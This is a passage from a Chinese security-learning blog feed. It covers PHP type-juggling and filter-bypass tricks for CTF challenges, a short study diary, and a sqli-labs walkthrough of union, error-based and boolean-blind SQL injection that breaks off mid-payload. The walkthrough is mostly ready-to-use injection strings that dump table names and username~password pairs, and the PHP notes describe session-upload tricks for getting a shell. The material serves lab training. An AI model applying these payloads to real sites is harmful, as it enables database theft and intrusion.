class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27;010574&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27; 1146&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="is-number"><a href="#is-number" class="headerlink" title="is_number()"></a>is_number()</h2><p>判断是否为数字(识别科学计数法)</p><p>在数字开头加入空格 换行符 tab 等特殊字符可以绕过检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="string">&#x27; 36&#x27;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="string">&#x27;36 &#x27;</span>); <span class="comment">// false</span></span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="string">&#x27;3 6&#x27;</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="string">&quot;\n36&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="string">&quot;\t36&quot;</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="string">&quot;36\n&quot;</span>); <span class="comment">// false</span></span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="string">&quot;36\t&quot;</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h2><p>判断元素是否在数组中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#以下，&#x27;7eee&#x27;被强制转换成整型 7</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;7eee&#x27;</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>]));<span class="comment">//true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#如果第三个参数设置为 true，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true。</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;7eee&#x27;</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>], <span class="literal">true</span>));<span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>同理:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v</span> = <span class="title function_ invoke__">in_array</span>(<span class="number">0</span>, <span class="keyword">array</span>(<span class="string">&#x27;s&#x27;</span>));</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$v</span>);<span class="comment">//bool(true)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在PHP中，当将字符串转换为整数时，如果字符串不是以有效的数字开头，它会被转换为 0。因此，在这个例子中，&#x27;s&#x27; 被转换为整数 0</span></span><br></pre></td></tr></table></figure><h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h2><p>一种正则函数</p><p>存在截断漏洞</p><p>%00 后面的字符串不解析</p><h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h2><p>strpos()函数查找字符串在另一字符串中第一次出现的位置。</p><p>strpos(‘01234’, 0) 返回的结果是 0 对应的索引 0, 也就是 false</p><p>代码使用了 if(!strpos($str, 0)) 对八进制(0x)进行过滤, 可以在字符串开头加空格绕过</p><p>strpos() 遇到数组返回 null</p><p>strrpos() stripos() strripos() 同理</p><h2 id="trim"><a href="#trim" class="headerlink" title="trim()"></a>trim()</h2><p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符：</span><br><span class="line">&quot;\0&quot; - NULL</span><br><span class="line">&quot;\t&quot; - 制表符</span><br><span class="line">&quot;\n&quot; - 换行</span><br><span class="line">&quot;\x0B&quot; - 垂直制表符</span><br><span class="line">&quot;\r&quot; - 回车</span><br><span class="line">&quot; &quot; - 空格</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">移除字符串两侧的字符（<span class="string">&quot;Hello&quot;</span> 中的 <span class="string">&quot;He&quot;</span> 以及 <span class="string">&quot;World&quot;</span> 中的 <span class="string">&quot;d!&quot;</span>）：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$str</span>,<span class="string">&quot;Hed!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//结果为:</span></span><br><span class="line"><span class="comment">//Hello World!</span></span><br><span class="line"><span class="comment">//llo Worl</span></span><br></pre></td></tr></table></figure><p>不过滤 \f 换页符, url 编码后是 %0c36</p><h2 id="GLOBALS-和-get-defined-vars"><a href="#GLOBALS-和-get-defined-vars" class="headerlink" title="$GLOBALS 和 get_defined_vars()"></a>$GLOBALS 和 get_defined_vars()</h2><p><a href="https://www.php.net/manual/zh/reserved.variables.globals">https://www.php.net/manual/zh/reserved.variables.globals</a><br><a href="https://www.php.net/manual/zh/function.get-defined-vars">https://www.php.net/manual/zh/function.get-defined-vars</a></p><p>$GLOBALS 引用全局作用域中可用的全部变量</p><p><code>get_defined_vars()</code>返回由所有已定义变量所组成的数组</p><p>有时候可以从这里面查看 $flag</p><h2 id="SERVER-‘argv’-与-SERVER-‘QUERY-STRING’"><a href="#SERVER-‘argv’-与-SERVER-‘QUERY-STRING’" class="headerlink" title="$_SERVER[‘argv’] 与 $_SERVER[‘QUERY_STRING’]"></a>$_SERVER[‘argv’] 与 $_SERVER[‘QUERY_STRING’]</h2><p>同样都是 GET 传参, 截取<code>?</code>之后的部分</p><p><code>\$_SERVER[&#39;argv&#39;]</code> 是数组, <code>\$_SERVER[&#39;QUERY_STRING&#39;]</code>是字符串</p><p><code>\$_SERVER[&#39;argv&#39;]</code> 用空格分割数组内容</p><h2 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h2><p>详解:<a href="https://www.cnblogs.com/litlife/p/10748506.html">https://www.cnblogs.com/litlife/p/10748506.html</a></p><p>简单来说就是我们可以通过这个机制来上传任意文件到缓存目录 (默认是 &#x2F;tmp), 并且在缓存目录下产生我们自定义的 session 文件</p><p>缓存文件的格式一般是 php[六位随机大小写字母], session 的格式是 sess_xxx (xxx 是 Cookie 中 PHPSESSID 的值)</p><p>可以配合命令执行的通配符, 或者进行 session 文件包含来 getshell, 有时候需要条件竞争</p><p>上传 payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://xxx/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xxx&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="静态调用方法"><a href="#静态调用方法" class="headerlink" title="静态调用方法"></a>静态调用方法</h2><p><a href="https://www.php.net/manual/zh/language.oop5.static.php">https://www.php.net/manual/zh/language.oop5.static.php</a></p><p>两种方式</p><p>通过 :: 访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span>::<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure><p>通过<code>call_user_func($_POST[&#39;ctfshow&#39;])</code>以数组形式调用静态方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</span><br></pre></td></tr></table></figure><h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><p><code>call_user_func(callable $callback, mixed ...$args): mixed</code><br>调用回调函数, 通常用来做免杀, 不过也可以调用类里面的方法</p><p>静态方法<br><code>call_user_func(&#39;myclass::static_method&#39;)</code></p><p>传递数组 (动态&#x2F;静态)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="string">&#x27;myclass&#x27;</span>, <span class="string">&#x27;static_method&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="keyword">new</span> <span class="title function_ invoke__">myclass</span>(), <span class="string">&#x27;dynamic_method&#x27;</span>));</span><br></pre></td></tr></table></figure><h2 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h2><p>有时候构造不带分号 payload 时需要用到三目运算符</p><p><code>return 1?phpinfo():1;</code><br>1 永远为 true, 于是正常执行 phpinfo</p><h2 id="escapeshellarg-escapeshellcmd"><a href="#escapeshellarg-escapeshellcmd" class="headerlink" title="escapeshellarg() &amp; escapeshellcmd()"></a>escapeshellarg() &amp; escapeshellcmd()</h2><h3 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg()"></a>escapeshellarg()</h3><p>将给字符串增加一个单引号并且能引用或者转义任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数,并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含exec()、system()和执行运算符。</p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h3 id="extract-parse-str"><a href="#extract-parse-str" class="headerlink" title="extract() parse_str()"></a>extract() parse_str()</h3><p>extract() 函数使用数组键名作为变量名，使用数组键值作为变量值，当变量中有同名的元素时，该函数默认将原有的值给覆盖掉。这就造成了变量覆盖</p><p><img src="https://p5.ssl.qhimg.com/t019c197edf2a17fb3b.png" alt="1"></p><p>POST方法传输进来的值通过<code>extrace()</code>函数处理，直接传入以POST的方式传入<code>pass=1&amp;thepassword_123=1</code>就可以进行将原本的变量覆盖，并且使两个变量相等即可。</p><p>还有就是这两个函数如果结合起来使用，也会造成变量覆盖</p><hr><p><img src="https://p2.ssl.qhimg.com/t01ee4693c210d149c7.png" alt="1"></p><p>代码中同时含有<code>parse_str和extract($_POST)</code>可以先将GET方法请求的解析成变量，然后再利用<code>extract()</code>函数从数组中将变量导入到当前的符号表,故payload为：</p><p><code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p><h3 id="变量覆盖-1"><a href="#变量覆盖-1" class="headerlink" title="$$变量覆盖"></a>$$变量覆盖</h3><p>$$符号在php中叫做 可变变量可以使变量名动态设置。</p><p>$$变量覆盖要具体结合代码来看，可能会需要借助某个参数进行传递值，也有可能使用$GLOBALS（引用全局作用域中可用的全部变量）来做题，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> $<span class="subst">&#123;$a&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> <span class="subst">$hello</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到在这里<code>$&#123;$a&#125;</code>等同于<code>$hello</code></p><p>接着我们再来看怎么来进行变量覆盖在第二行中遍历了全局变量<code>$_GET</code>，第三行将key当作变量名，把value赋值。那么我们传入<code>http://127.0.0.1/1.php?auth=1</code>时会将<code>$auth</code>的值覆盖为1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$auth</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line"><span class="variable">$$key</span>=<span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$auth</span>;</span><br></pre></td></tr></table></figure><h3 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables"></a>import_request_variables</h3><p>将 <code>GET/POST/Cookie</code> 变量导入到全局作用域中，如果你禁止了 <code>register_globals</code>，但又想用到一些全局变量，那么此函数就很有用。那么和<code>register_globals</code>存在相同的变量覆盖问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$auth</span> =<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">import request <span class="title function_ invoke__">variables</span>(<span class="string">&#x27;G&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$auth</span> == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;over!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样传入<code>http://127.0.0.1/1.php?auth=1</code>时会将<code>$auth</code>的值覆盖为1，输出<code>over!</code></p><h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h2><p>详解:<a href="https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#%E7%88%AC%E5%9D%911">https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#%E7%88%AC%E5%9D%911</a></p><p>正则匹配函数遇到数组会返回false</p><p>前面加上%0a</p><h2 id="字符转换"><a href="#字符转换" class="headerlink" title="字符转换"></a>字符转换</h2><p>当我们传入参数时,php首先会删除空白符</p><p>之后php会自动把一些不合法的字符(<code>[ 空格 + .</code>四种字符)转换为下划线(php8以下),且转换只会发生一次</p><p>例如让我们传入<code>e_v.a.l</code>,为了防止参数后面的小数点被转换,可以传入<code>e[v.a.l</code>,这样非法字符提前出现,后面的小数点就不会被转换了,且转换后结果一致</p><h2 id="不加引号的字符串"><a href="#不加引号的字符串" class="headerlink" title="不加引号的字符串"></a>不加引号的字符串</h2><p>PHP 会自动帮我们推断对应值的类型</p><p>例如下面的代码执行后会爆 Warning, 但能正常输出<code>flag_give_me</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fl0g</span> = flag_give_me;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fl0g</span>;</span><br></pre></td></tr></table></figure><h2 id="属性类型不敏感"><a href="#属性类型不敏感" class="headerlink" title="属性类型不敏感"></a>属性类型不敏感</h2><p>在<code>PHP 7.1 +</code>的版本中, 对属性类型(public protected private)不敏感</p><p>因为<code>protected</code>和<code>private</code>反序列化后的结果中含有<code>%00</code>, 部分题目会禁止这种字符, 可在构造payload时将属性全部改成<code>public</code>来绕过限制</p><h2 id="PHP精度绕过缺陷"><a href="#PHP精度绕过缺陷" class="headerlink" title="PHP精度绕过缺陷"></a>PHP精度绕过缺陷</h2><p>详解:<a href="http://www.haodaquan.com/12">http://www.haodaquan.com/12</a></p><p>简单的说因为PHP通常使用<code>IEEE 754</code>双精度格式而且由于浮点数的精度有限的原因。除此之外取整而导致的最大相对误差为<code>1.11e-16</code>,当小数小于<code>10^-16</code>后，PHP对于小数就大小不分了，如下图：</p><p><img src="https://p1.ssl.qhimg.com/t01f061707d326ceca6.png" alt="1"></p><h2 id="正则回溯"><a href="#正则回溯" class="headerlink" title="正则回溯"></a>正则回溯</h2><p>详解:<a href="https://www.freebuf.com/articles/web/339976.html">https://www.freebuf.com/articles/web/339976.html</a></p><h2 id="部分内容参考文献"><a href="#部分内容参考文献" class="headerlink" title="部分内容参考文献"></a>部分内容参考文献</h2><p><a href="https://www.anquanke.com/post/id/231507#h2-9">https://www.anquanke.com/post/id/231507#h2-9</a><br><a href="https://exp10it.io/2022/08/php-%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/#strpos">https://exp10it.io/2022/08/php-%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/#strpos</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新周记2</title>
      <link href="/2024/01/28/%E5%91%A8%E8%AE%B0-2024-01-28-%E6%96%B0%E5%91%A8%E8%AE%B02/"/>
      <url>/2024/01/28/%E5%91%A8%E8%AE%B0-2024-01-28-%E6%96%B0%E5%91%A8%E8%AE%B02/</url>
      
        <content type="html"><![CDATA[<h2 id="周记2"><a href="#周记2" class="headerlink" title="周记2"></a>周记2</h2><p>这次根据任务加强一下对于Python的运用,简略并且快速的复习一下基本语法,并深入学习了一下正则以及爬虫之类的知识,发现有好多遗漏和没学习到的知识(看了学长发的正则教程真是受益匪浅),最后巩固一下计算机网络的知识框架</p><p>为了更好的运用,正好把之前就有的想法实践一番,自己写脚本做出sqli-labs中的几道盲注题和upload-labs的竞争上传题,并且好好的去看看SQLmap的工具源码</p><p>借此继续填坑知识点总结,总结一波sql注入,学习一下SQLmap工具,还学习到了二次注入和很多绕过技巧等,链接如下:</p><p><a href="https://hades-blog.github.io/2024/01/23/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-sql%E6%B3%A8%E5%85%A5/">https://Hades-blog.github.io/2024/01/23/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-sql%E6%B3%A8%E5%85%A5/</a></p><p>此外,复盘了一下春秋杯冬季赛的web题,正好学习了一下打redis,链接如下:</p><p><a href="https://hades-blog.github.io/2023/08/25/CTF-2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-CTF-web/">https://Hades-blog.github.io/2023/08/25/CTF-2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-CTF-web/</a></p>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-labs</title>
      <link href="/2024/01/26/%E9%9D%B6%E5%9C%BA-2023-11-12-SQL-labs/"/>
      <url>/2024/01/26/%E9%9D%B6%E5%9C%BA-2023-11-12-SQL-labs/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入靶场"><a href="#SQL注入靶场" class="headerlink" title="SQL注入靶场"></a>SQL注入靶场</h2><p>一些知识点详见周记4和6的SQL注入部分:</p><p><a href="https://hades-blog.github.io/2023/10/29/%E5%91%A8%E8%AE%B0-2023-10-29-%E5%91%A8%E8%AE%B04/">https://Hades-blog.github.io/2023/10/29/%E5%91%A8%E8%AE%B0-2023-10-29-%E5%91%A8%E8%AE%B04/</a><br><a href="https://hades-blog.github.io/2023/11/12/%E5%91%A8%E8%AE%B0-2023-11-12-%E5%91%A8%E8%AE%B06/">https://Hades-blog.github.io/2023/11/12/%E5%91%A8%E8%AE%B0-2023-11-12-%E5%91%A8%E8%AE%B06/</a></p><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>字符型union注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">找到注入点闭合后查列数:</span><br><span class="line">?id=1&#x27; order by 3--+</span><br><span class="line">闭合后查库(security):</span><br><span class="line">-1&#x27; union select 1,database(),3--+</span><br><span class="line">查表:</span><br><span class="line">-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3--+</span><br><span class="line">查列:</span><br><span class="line">-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),3--+</span><br><span class="line">查数据:</span><br><span class="line">?id=-1&#x27; union select 1,2,group_concat(username ,&#x27;~&#x27;, password) from users--+</span><br></pre></td></tr></table></figure><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>数字型union注入(单引号)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">找到注入点后查列数:</span><br><span class="line">?id=1 order by 3</span><br><span class="line">闭合后查库:</span><br><span class="line">?id=-1 union select 1,database(),3</span><br><span class="line">查表:</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">查列:</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">查数据:</span><br><span class="line">?id=-1 union select 1,2,group_concat(username ,&#x27;~&#x27;, password) from users</span><br></pre></td></tr></table></figure><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>字符型union注入(单引号括号)</p><p>同理:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)--+</span><br><span class="line">?id=1&#x27;) order by 3--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,&#x27;~&#x27;, password) from users--+</span><br></pre></td></tr></table></figure><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>字符型union注入(双引号括号)</p><p>同理:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,`~`, password) from users--+</span><br></pre></td></tr></table></figure><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>单引号闭合,报错注入(无数据回显,有报错回显,这里本人用一下报错注入)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">闭合后查库:</span><br><span class="line">?id=1&#x27;and extractvalue(1, concat(0x7e,(select database()))) --+</span><br><span class="line">查表:</span><br><span class="line">?id=1&#x27;and extractvalue(1, concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))--+</span><br><span class="line">查列:</span><br><span class="line">?id=1&#x27;and extractvalue(1, concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)))--+</span><br><span class="line">查数据:</span><br><span class="line">?id=1&#x27;and extractvalue(1, concat(&#x27;~&#x27;,(select group_concat(username ,&#x27;~&#x27;, password) from users)))--+</span><br></pre></td></tr></table></figure><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>双引号闭合,报错注入(方法同上)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;&#x27;and extractvalue(1, concat(0x7e,(select database()))) --+</span><br><span class="line">?id=1&#x27;&#x27;and extractvalue(1, concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))--+</span><br><span class="line">?id=1&#x27;&#x27;and extractvalue(1, concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)))--+</span><br><span class="line">?id=1&#x27;&#x27;and extractvalue(1, concat(&#x27;~&#x27;,(select group_concat(username ,&#x27;~&#x27;, password) from users)))--+</span><br></pre></td></tr></table></figure><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p><code>&#39;))</code>闭合,布尔盲注(无数据回显,无报错回显,只能盲注,这里本人用一下布尔盲注)</p><p>过程:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">判断库名长度:</span><br><span class="line">?id=1&#x27;)) and length((select database()))&gt;9--+</span><br><span class="line">依次爆库名:</span><br><span class="line">?id=1&#x27;)) and ascii(substr((select database()),1,1))=115--+。</span><br><span class="line">判断表名长度:  </span><br><span class="line">?id=1&#x27;)) and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--+</span><br><span class="line">依次爆表名:</span><br><span class="line">?id=1&#x27;)) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99--+</span><br><span class="line">判断列名长度:</span><br><span class="line">?id=1&#x27;)) and length((select 